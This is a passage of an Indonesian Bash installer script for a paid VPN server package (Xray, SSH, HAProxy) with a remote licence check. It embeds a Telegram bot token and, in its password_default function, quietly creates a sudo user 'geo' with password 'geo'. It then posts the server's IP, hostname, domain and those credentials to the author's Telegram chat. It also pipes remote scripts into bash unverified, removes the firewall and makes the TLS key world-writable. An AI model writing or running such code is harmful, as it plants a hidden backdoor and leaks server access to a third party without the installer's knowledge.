#!/bin/bash

# =========================================
# Quick Setup | Script Setup Manager
# Edition : Stable Edition V3.1
# Author  : Geo Project
# (C) Copyright 2024
# =========================================

# Hapus file premi.sh jika ada
rm -f /root/prem.sh > /dev/null 2>&1

# Pastikan skrip dijalankan sebagai root
if [ "${EUID}" -ne 0 ]; then
    echo -e "\e[31m[ERROR]\e[0m Mohon jalankan skrip ini sebagai pengguna root!"
    exit 1
fi

# Konfigurasi .profile untuk membersihkan layar saat login
cat > /root/.profile <<EOF
clear
sleep 5
screen -r > /dev/null 2>&1
EOF

# Definisi Warna
GREEN="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${GREEN}   ✔ ${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;36m"
NC='\e[0m'
red='\e[1;31m'
green='\e[0;32m'

mkdir -p /etc/ambe/
cat >/etc/ambe/var.txt <<EOF
INFO_KILLS="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
INFO_AKUN="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
INFO_BACKUP="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
INFO_INSTALLER="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
INFO_DAFTAR="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
ADMIN="1467883032"
TIME="10"
EOF
source '/etc/ambe/var.txt'

# Bersihkan layar
clear
clear && clear && clear

# Ekspor Informasi IP Address
export IP=$(curl -sS ipinfo.io/ip)

# Tampilkan Banner
echo -e "${GRAY}----------------------------------------------------------${NC}"
echo -e "  Selamat Datang di Geo Project Script Installer ${GRAY}(${NC}${GREEN} Stable Edition ${NC}${GRAY})${NC}"
echo -e "  Ini akan dengan cepat mengatur Server VPN di Server Anda"
echo -e "          Penulis : ${GREEN}Geo ${NC}${GRAY}(${NC} ${GREEN}tunnel ${NC}${GRAY})${NC}"
echo -e "        © Di-recode oleh Geo VPN ${GRAY}(${NC} 2023 ${GRAY})${NC}"
echo -e "${GRAY}----------------------------------------------------------${NC}"
echo ""
sleep 1

ipsaya=$(wget -qO- ipinfo.io/ip)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/jaka2m/permission/main/ipmini"

checking_sc() {
    useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
    if [[ "$date_list" < "$useexp" ]]; then
        echo -ne
    else
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e "\033[42m          GEO PROJECT AUTOSCRIPT            \033[0m"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e ""
        echo -e "              ${RED}IZIN DITOLAK !${NC}"
        echo -e "       \033[0;33mVPS Anda${NC} $ipsaya \033[0;33mTelah Diblokir${NC}"
        echo -e "         \033[0;33mBeli akses izin untuk skrip${NC}"
        echo -e "               \033[0;33mHubungi Admin :${NC}"
        echo -e "        \033[0;36mTelegram${NC} t.me/sampiiiiu"
        echo -e "        ${GREEN}WhatsApp${NC} wa.me/6282339191527"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        exit
    fi
}
checking_sc

# --- OS Architecture Check ---
ARCH=$(uname -m)
if [[ "$ARCH" == "x86_64" ]]; then
    echo -e "${OK} Your Architecture is Supported (${GREEN}${ARCH}${NC})"
else
    echo -e "${ERROR} Your Architecture is Not Supported (${GRAY}${ARCH}${NC})"
    exit 1
fi

# --- Operating System Check ---
if [[ -f /etc/os-release ]]; then
    . /etc/os-release # Loads variables like ID and PRETTY_NAME
    if [[ "$ID" == "ubuntu" || "$ID" == "debian" ]]; then
        echo -e "${OK} Your OS is Supported (${GREEN}${PRETTY_NAME}${NC})"
    else
        echo -e "${ERROR} Your OS is Not Supported (${GRAY}${PRETTY_NAME}${NC})"
        exit 1
    fi
else
    echo -e "${ERROR} /etc/os-release file not found. Unable to detect OS."
    exit 1
fi

# --- Validate Pre-defined IP Address (if any) ---
if [[ -z "$IP" ]]; then
    echo -e "${ERROR} IP Address ( ${GRAY}Not Detected${NC} )"
else
    echo -e "${OK} IP Address ( ${GREEN}${IP}${NC} )"
fi

# --- Get Public IP Address ---
MYIP=$(curl -sS ipv4.icanhazip.com)
if [[ -z "$MYIP" ]]; then
    echo -e "${ERROR} Failed to get public IP. Ensure internet connection is working."
    exit 1
fi
echo -e "${OK} Public IP Detected: ${GREEN}${MYIP}${NC}"

# --- Source URL for User Data and Permissions ---
USERNAME_SOURCE="{data_ip}"

# --- Remove and Recreate /usr/bin/user file ---
if [[ -f /usr/bin/user ]]; then
    rm -f /usr/bin/user
    if [[ $? -ne 0 ]]; then
        echo -e "${ERROR} Failed to delete /usr/bin/user. Check permissions."
        exit 1
    fi
fi

# --- Fetch and Store Username ---
username=$(curl -sS "$USERNAME_SOURCE" | grep "$MYIP" | awk '{print $2}')
if [[ -z "$username" ]]; then
    echo -e "${ERROR} Username not found for IP ${GRAY}${MYIP}${NC} from ${USERNAME_SOURCE}."
    # Uncomment the line below if a username is absolutely required
    # exit 1
else
    echo -e "${OK} Username Detected: ${GREEN}${username}${NC}"
    echo "$username" > /usr/bin/user
    if [[ $? -ne 0 ]]; then
        echo -e "${ERROR} Failed to write username to /usr/bin/user. Check permissions (might need sudo)."
        exit 1
    fi
fi

# --- Fetch and Store Expiration Date (expx) ---
expx=$(curl -sS "$USERNAME_SOURCE" | grep "$MYIP" | awk '{print $3}')
if [[ -z "$expx" ]]; then
    echo -e "${ERROR} Expiration date not found for IP ${GRAY}${MYIP}${NC}."
    # Optional: exit 1
else
    echo -e "${OK} Expiration Date Detected : ${GREEN}${expx}${NC}"
    echo "$expx" > /usr/bin/e
    if [[ $? -ne 0 ]]; then
        echo -e "${ERROR} Failed to write expiration date to /usr/bin/e. Check permissions."
        exit 1
    fi
fi

# --- Fetch Exp1 (4th column) ---
Exp1=$(curl -sS "$USERNAME_SOURCE" | grep "$MYIP" | awk '{print $4}')
if [[ -z "$Exp1" ]]; then
    echo -e "${ERROR} Exp1 data (4th column) not found for IP ${GRAY}${MYIP}${NC}."
    # No 'else' block needed here as no action is taken if found
fi

# --- Check Account Status (Expired/Active) ---
today_date=$(date +'%Y-%m-%d') # Today's date format
DATE=$(date +'%Y-%m-%d') # DATE variable set here for consistency if used later

if [[ -n "$expx" ]]; then # Ensure expx is not empty before comparing
    if [[ "$today_date" < "$expx" ]]; then
        echo -e "${OK} Account Status: ${INFO} (Valid until: ${GREEN}${expx}${NC})"
    else
        echo -e "${OK} Account Status: ${RED}Expired (Expired on: ${RED}${expx}${NC})" # Used RED for clarity
        # You might want to add exit 1 here if an expired account should not proceed
    fi
else
    echo -e "${ERROR} Expiration date not available for status check."
fi

echo ""
read -p "$(echo -e "Press ${GRAY}[ ${NC}${GREEN}Enter${NC} ${GRAY}]${NC} To Start Installation") "
echo ""
clear

if [ "${EUID}" -ne 0 ]; then
    echo "Anda perlu menjalankan skrip ini sebagai root"
    exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
    echo "OpenVZ tidak didukung"
    exit 1
fi

echo -e "${GREEN}memuat...${NC}"
clear

MYIP=$(curl -sS ipv4.icanhazip.com)
rm -f /usr/bin/user
username=$(curl {data_ip} | grep "$MYIP" | awk '{print $2}')
echo "$username" > /usr/bin/user

expx=$(curl {data_ip} | grep "$MYIP" | awk '{print $3}')
echo "$expx" > /usr/bin/e
DATE=$(date +'%Y-%m-%d')

# Status Expired/Active
Info="(${GREEN}Aktif${NC})"
Error="(${RED}Kedaluwarsa${NC})"
today_date=$(date -d "0 days" +"%Y-%m-%d")
Exp1=$(curl {data_ip} | grep "$MYIP" | awk '{print $4}')

if [[ "$today_date" < "$Exp1" ]]; then
    sts="${Info}"
else
    sts="${Error}"
fi

echo -e "${GREEN}memuat...${NC}"
clear

# REPO
REPO="https://raw.githubusercontent.com/jaka2m/vip/main/"

start=$(date +%s)
secs_to_human() {
    echo "Waktu instalasi : $((${1} / 3600)) jam $((((${1} / 60) % 60))) menit $((${1} % 60)) detik"
}

function samawa(){
clear
echo -e " ${GRAY}┌─────────────────────────────────────────────────────┐${NC}"
echo -e " ${GRAY}│${NC}${GRAY}         ____ _____ _____     ______  _   _${NC}${GRAY}          │${NC}"
echo -e " ${GRAY}│${NC}${GRAY}        / ___| ____/ _ \ \   / /  _ \| \ | |${NC}${GRAY}         │${NC}"
echo -e " ${GRAY}│${NC}${GRAY}       | |  _|  _|| | | \ \ / /| |_) |  \| |${NC}${GRAY}         │${NC}"
echo -e " ${GRAY}│${NC}${GRAY}       | |_| | |__| |_| |\ V / |  __/| |\  |${NC}${GRAY}         │${NC}"
echo -e " ${GRAY}│${NC}${GRAY}        \____|_____\___/  \_/  |_|   |_| \_|${NC}${GREEN}         │${NC}"
echo -e " ${GRAY}│${NC}                                                    ${GRAY} │${NC}"
echo -e " ${GRAY}│${NC}             MULTIPORT VPN SCRIPT V3.1              ${GRAY} │${NC}"
echo -e " ${GRAY}│${NC}                   WWW.GEOVPN.COM                   ${GRAY} │${NC}"
echo -e " ${GRAY}│${NC}    TELEGRAM CH ${GREEN}@testikuy_mang${NC} ADMIN ${GRAY}@sampiiiiu${NC}    ${GRAY}  │${NC}"
echo -e " ${GRAY}└─────────────────────────────────────────────────────┘${NC}"
}

### Status
function print_ok() {
    echo -e "${OK} ${GREEN} $1 ${FONT}"
}
function print_install() {
	echo -e "${GRAY} =============================== ${FONT}"
    echo -e "${GRAY} # $1 ${FONT}"
	echo -e "${GRAY} =============================== ${FONT}"
    sleep 1
}

function print_error() {
    echo -e "${ERROR} ${REDBG} $1 ${FONT}"
}

function print_success() {
    if [[ 0 -eq $? ]]; then
		echo -e "${GRAY} =============================== ${FONT}"
        echo -e "${GREEN} # $1 berhasil dipasang"
		echo -e "${GRAY} =============================== ${FONT}"
        sleep 2
    fi
}

### Cek root
function is_root() {
    if [[ 0 == "$UID" ]]; then
        print_ok "Root user Start installation process"
    else
        print_error "The current user is not the root user, please switch to the root user and run the script again"
    fi

}

# Buat direktori xray
print_install "Membuat direktori xray"
    mkdir -p /etc/xray
    
    rm -f /etc/xray/city >/dev/null 2>&1
    rm -f /etc/xray/isp >/dev/null 2>&1
    curl -s ipinfo.io/city >> /etc/xray/city
    curl -s ifconfig.me > /etc/xray/ipvps
    curl -s ipinfo.io/org | cut -d " " -f 2-10 >> /etc/xray/isp
    touch /etc/xray/domain
    mkdir -p /var/log/xray
    chown www-data.www-data /var/log/xray
    chmod +x /var/log/xray
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
    mkdir -p /var/lib/geovpn >/dev/null 2>&1
    # // Ram Information
    while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
    esac
    done < /proc/meminfo
    Ram_Usage="$((mem_used / 1024))"
    Ram_Total="$((mem_total / 1024))"
    export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
    export Kernel=$( uname -r )
    export Arch=$( uname -m )
    export IP=$( curl -s https://ipinfo.io/ip/ )

# Change Environment System
function first_setup(){
    timedatectl set-timezone Asia/Jakarta
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    print_success "Directory Xray"
    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
    echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
    sudo apt update -y
    apt-get install --no-install-recommends software-properties-common
    add-apt-repository ppa:vbernat/haproxy-2.0 -y
    apt-get -y install haproxy=2.0.\*
elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
    echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
    curl https://haproxy.debian.net/bernat.debian.org.gpg |
        gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
    echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
        http://haproxy.debian.net buster-backports-1.8 main \
        >/etc/apt/sources.list.d/haproxy.list
    sudo apt-get update
    apt-get -y install haproxy=1.8.\*
else
    echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
    exit 1
fi
}

## GEO PROJECT
clear
function nginx_install() {
    # // Checking System
    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
        print_install "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
        # // sudo add-apt-repository ppa:nginx/stable -y 
        sudo apt-get install nginx -y 
    elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
        print_success "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
        apt -y install nginx 
    else
        echo -e " Your OS Is Not Supported ( ${GRAY}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${FONT} )"
        # // exit 1
    fi
}

# Update and remove packages
function base_package() {
    clear
    ########
    print_install "Menginstall Packet Yang Dibutuhkan"
    apt install zip pwgen openssl netcat socat cron bash-completion -y
    apt install figlet -y
    apt update -y
    apt upgrade -y
    apt dist-upgrade -y
    systemctl enable chronyd
    systemctl restart chronyd
    systemctl enable chrony
    systemctl restart chrony
    chronyc sourcestats -v
    chronyc tracking -v
    apt install ntpdate -y
    ntpdate pool.ntp.org
    apt install sudo -y
    apt install dropbear -y
    sudo apt-get clean all
    sudo apt-get autoremove -y
    sudo apt-get install -y debconf-utils
    sudo apt-get remove --purge exim4 -y
    sudo apt-get remove --purge ufw firewalld -y
    sudo apt-get install -y --no-install-recommends software-properties-common
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq openvpn easy-rsa
    print_success "Packet Yang Dibutuhkan"
    
}
clear
# Fungsi input domain
function pasang_domain() {
echo -e ""
clear
samawa
echo -e "   .----------------------------------."
echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
echo -e "   '----------------------------------'"
echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
echo -e "   ------------------------------------"
read -p "   Please select numbers 1-2 or Any Button(Random) : " host
echo ""
if [[ $host == "1" ]]; then
echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
read -p "   Subdomain: " host1
echo "IP=" >> /var/lib/geovpn/ipvps.conf
echo $host1 > /etc/xray/domain
echo $host1 > /root/domain
echo ""
elif [[ $host == "2" ]]; then
#install cf
wget ${REPO}ssh/cf.sh && chmod +x cf.sh && ./cf.sh
rm -f /root/cf.sh
clear
else
print_install "Random Subdomain/Domain is Used"
wget ${REPO}cf.sh && chmod +x cf.sh && ./cf.sh
rm -f /root/cf.sh
clear
    fi
    print_success "Subdomain/Domain"
    echo ""
    echo ""
    echo "${GRAY}Subdomain/Domain anda :${NC} ${OK} ${SUB_DOMAIN} ${NC}"
sleep 2
}

clear
#GANTI PASSWORD DEFAULT
function password_default() {
domain=$(cat /root/domain)
userdel geo > /dev/null 2>&1
Username="geo"
Password=geo
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
URL="https://api.telegram.org/bot$INFO_INSTALLER/sendMessage"
TEXT="Installasi VPN Script Stable V3.1
============================
<code>Tanggal    :</code> <code>$tanggal</code>
<code>Hostname   :</code> <code>${HOSTNAME}</code>
<code>OS Vps     :</code> <code>$OS_Name</code>
<code>Kernel     :</code> <code>$Kernel</code>
<code>Arch       :</code> <code>$Arch</code>
<code>Ram Left   :</code> <code>$Ram_Usage MB</code>
<code>Ram Used   :</code> <code>$Ram_Total MB</code>
============================
<code>Domain     :</code> <code>$domain</code>
<code>IP VPS     :</code> <code>$IP</code>
<code>User Login :</code> <code>$Username</code>
<code>Pass Login :</code> <code>$Password</code>
<code>User Script:</code> <code>$Nama_Issued_License</code>
<code>Exp Script :</code> <code>$Masa_Laku_License_Berlaku_Sampai</code>
============================
(c) Copyright 2025 By GEO PROJECT
============================
<i>Automatic Notification from</i>
<i>Github GEOVPN</i>
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/tau_samawa"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://t.me/testikuy_mang/163"}]]}'
curl -s --max-time $TIME -d "chat_id=$ADMIN&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}

clear
# Pasang SSL
function pasang_ssl() {
clear
print_install "Memasang SSL Pada Domain"
    rm -rf /etc/xray/xray.key
    rm -rf /etc/xray/xray.crt
    domain=$(cat /root/domain)
    STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
    rm -rf /root/.acme.sh
    mkdir /root/.acme.sh
    systemctl stop $STOPWEBSERVER
    systemctl stop nginx
    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
    chmod +x /root/.acme.sh/acme.sh
    /root/.acme.sh/acme.sh --upgrade --auto-upgrade
    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
    /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
    ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
    chmod 777 /etc/xray/xray.key
    print_success "SSL Certificate"
}

function make_folder_xray() {
rm -rf /etc/vmess/.vmess.db
    rm -rf /etc/vless/.vless.db
    rm -rf /etc/trojan/.trojan.db
    rm -rf /etc/shadowsocks/.shadowsocks.db
    rm -rf /etc/ssh/.ssh.db
    rm -rf /etc/bot/.bot.db
    mkdir -p /etc/bot
    mkdir -p /etc/xray
    mkdir -p /etc/vmess
    mkdir -p /etc/vless
    mkdir -p /etc/trojan
    mkdir -p /etc/shadowsocks
    mkdir -p /etc/ssh
    mkdir -p /usr/bin/xray/
    mkdir -p /var/log/xray/
    mkdir -p /var/www/html
    mkdir -p /etc/geovpn/limit/vmess/ip
    mkdir -p /etc/geovpn/limit/vless/ip
    mkdir -p /etc/geovpn/limit/trojan/ip
    mkdir -p /etc/geovpn/limit/ssh/ip
    mkdir -p /etc/limit/vmess
    mkdir -p /etc/limit/vless
    mkdir -p /etc/limit/trojan
    mkdir -p /etc/limit/ssh
    chmod +x /var/log/xray
    touch /etc/xray/domain
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
    touch /etc/vmess/.vmess.db
    touch /etc/vless/.vless.db
    touch /etc/trojan/.trojan.db
    touch /etc/shadowsocks/.shadowsocks.db
    touch /etc/ssh/.ssh.db
    touch /etc/bot/.bot.db
    echo "& plughin Account" >>/etc/vmess/.vmess.db
    echo "& plughin Account" >>/etc/vless/.vless.db
    echo "& plughin Account" >>/etc/trojan/.trojan.db
    echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
    echo "& plughin Account" >>/etc/ssh/.ssh.db
    }
#Instal Xray
function install_xray() {
clear
    print_install "Core Xray 1.8.1 Latest Version"
    # install xray
    #echo -e "[ ${GREEN}INFO$NC ] Downloading & Installing xray core"
    domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
    chown www-data.www-data $domainSock_dir
    
    # / / Ambil Xray Core Version Terbaru
latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
 
    # // Ambil Config Server
    wget -O /etc/xray/config.json "${REPO}xray/config.json" >/dev/null 2>&1
    #wget -O /usr/local/bin/xray "${REPO}xray/xray.linux.64bit" >/dev/null 2>&1
    wget -O /etc/systemd/system/runn.service "${REPO}xray/runn.service" >/dev/null 2>&1
    #chmod +x /usr/local/bin/xray
    domain=$(cat /etc/xray/domain)
    IPVS=$(cat /etc/xray/ipvps)
    print_success "Core Xray 1.8.1 Latest Version"
    
    # Settings UP Nginix Server
    clear
    curl -s ipinfo.io/city >>/etc/xray/city
    curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
    print_install "Memasang Konfigurasi Packet"
    wget -O /etc/haproxy/haproxy.cfg "${REPO}xray/haproxy.cfg" >/dev/null 2>&1
    wget -O /etc/nginx/conf.d/xray.conf "${REPO}xray/xray.conf" >/dev/null 2>&1
    sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
    curl ${REPO}ssh/nginx.conf > /etc/nginx/nginx.conf
    
cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem

    # > Set Permission
    chmod +x /etc/systemd/system/runn.service

    # > Create Service
    rm -rf /etc/systemd/system/xray.service.d
    cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target

EOF
print_success "Konfigurasi Packet"
}

function ssh(){
    clear
    echo -e "${GRAY}----------------------------------------------------------${NC}"
    echo -e "                 Memulai Konfigurasi SSH"
    echo -e "${GRAY}----------------------------------------------------------${NC}"
    echo ""

    # Memasang Konfigurasi Password SSH
    print_install "Memasang Konfigurasi Password SSH"
    wget -O /etc/pam.d/common-password "${REPO}ssh/password"
    if [ $? -eq 0 ]; then
        chmod +x /etc/pam.d/common-password
        print_success "Konfigurasi password SSH berhasil dipasang."
    else
        print_error "Gagal mengunduh atau memasang konfigurasi password SSH."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    # Mengkonfigurasi Pengaturan Keyboard (non-interaktif)
    print_install "Mengkonfigurasi Pengaturan Keyboard"
    DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
    if [ $? -eq 0 ]; then
        print_success "Pengaturan keyboard."
    else
        print_error "pengaturan keyboard."
    fi

    # Kembali ke direktori root
    cd /root || { print_error "Masuk ke direktori /root."; return 1; }

    # Membuat atau Mengedit file /etc/systemd/system/rc-local.service
    print_install "Mengkonfigurasi rc-local.service"
    cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END
    if [ $? -eq 0 ]; then
        print_success "File rc-local.service."
    else
        print_error "Gagal membuat/mengedit file rc-local.service."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    # Membuat atau Mengedit file /etc/rc.local
    print_install "Mengkonfigurasi /etc/rc.local"
    cat > /etc/rc.local <<-END
#!/bin/sh -e
# rc.local
# By default this script does nothing.
exit 0
END
    if [ $? -eq 0 ]; then
        chmod +x /etc/rc.local
        print_success "File /etc/rc.local."
    else
        print_error "Gagal membuat/mengedit file /etc/rc.local."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    # Mengaktifkan dan Memulai rc-local.service
    print_install "Mengaktifkan dan Memulai rc-local.service"
    systemctl enable rc-local &>/dev/null
    systemctl start rc-local.service &>/dev/null
    if systemctl is-active --quiet rc-local.service; then
        print_success "rc-local.service."
    else
        print_error "Gagal mengaktifkan atau memulai rc-local.service."
    fi

    # Menonaktifkan IPv6
    print_install "Menonaktifkan IPv6"
    echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
    if [ $? -eq 0 ]; then
        sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
        print_success "IPv6."
    else
        print_error "Gagal menonaktifkan IPv6."
    fi

    # Setel Zona Waktu ke GMT +7 (Asia/Jakarta)
    print_install "Menyetel Zona Waktu ke Asia/Jakarta"
    ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
    if [ $? -eq 0 ]; then
        print_success "Zona Waktu disetel ke Asia/Jakarta."
    else
        print_error "Gagal menyetel Zona Waktu."
    fi

    # Nonaktifkan AcceptEnv di sshd_config
    print_install "Mengamankan konfigurasi SSH (sshd_config)"
    sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
    if [ $? -eq 0 ]; then
        print_success "Pengaturan AcceptEnv di sshd_config berhasil dinonaktifkan."
    else
        print_error "Gagal menonaktifkan pengaturan AcceptEnv di sshd_config."
    fi

    echo ""
    echo -e "${GRAY}----------------------------------------------------------${NC}"
    echo -e "           Konfigurasi SSH Selesai"
    echo -e "${GRAY}----------------------------------------------------------${NC}"
    echo ""
}

function limit_quota(){
    clear
    echo -e "${GRAY}----------------------------------------------------------${NC}"
    echo -e "             Memulai Pengaturan Batas Kuota"
    echo -e "${GRAY}----------------------------------------------------------${NC}"
    echo ""

    print_install "Memasang Skrip Batas Kuota"
    # Unduh dan atur izin untuk skrip 'quota'
    wget -q -O /usr/local/sbin/quota "${REPO}limit/quota"
    if [ $? -eq 0 ]; then
        chmod +x /usr/local/sbin/quota
        # Menghapus karakter Carriage Return (CR) jika ada (dari unduhan Windows)
        sed -i 's/\r//' /usr/local/sbin/quota
        print_success "Skrip 'quota' di /usr/local/sbin/."
    else
        print_error "Gagal mengunduh skrip 'quota'."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    print_install "Memasang Skrip Batas IP"
    # Unduh dan atur izin untuk skrip 'limit-ip'
    wget -q -O /usr/bin/limit-ip "${REPO}limit/limit-ip"
    if [ $? -eq 0 ]; then
        chmod +x /usr/bin/limit-ip
        # Menghapus karakter Carriage Return (CR) jika ada
        sed -i 's/\r//' /usr/bin/limit-ip
